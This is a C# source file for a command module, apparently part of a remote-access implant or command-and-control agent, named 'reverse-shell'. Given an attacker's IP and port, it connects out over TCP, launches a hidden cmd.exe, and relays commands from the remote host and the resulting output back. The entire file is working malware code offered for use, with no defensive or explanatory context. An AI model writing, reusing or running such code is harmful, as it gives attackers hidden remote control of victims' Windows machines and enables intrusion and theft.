using Agent.Commands;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Commands
{
    public class ReverseShellCommand : AgentCommand
    {
        private StreamWriter streamWriter;

        public override string Name => "reverse-shell";
        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, MessageManager commm)
        {
			if (task.SplittedArgs.Count() != 2)
			{
				result.Result = $"Usage : {this.Name} Ip port";
				return;
			}

			string ip = task.SplittedArgs[0];
			int port = int.Parse(task.SplittedArgs[1]);

			using (TcpClient client = new TcpClient(ip, port))
			{
				using (Stream stream = client.GetStream())
				{
					using (StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.ErrorDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();
						p.BeginErrorReadLine();

						bool shouldExit = false;
						while (client.Connected && !shouldExit)
						{
							strInput.Append(rdr.ReadLine());
							if (strInput.ToString().ToLower().Equals("exit"))
								shouldExit = true;
							p.StandardInput.WriteLine(strInput);
							p.StandardInput.WriteLine();
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
		{
			StringBuilder strOutput = new StringBuilder();

			if (!String.IsNullOrEmpty(outLine.Data))
			{
				try
				{
					strOutput.Append(outLine.Data);
					streamWriter.WriteLine(strOutput);
					streamWriter.Flush();
				}
				catch (Exception err) { }
			}
		}
	}
}
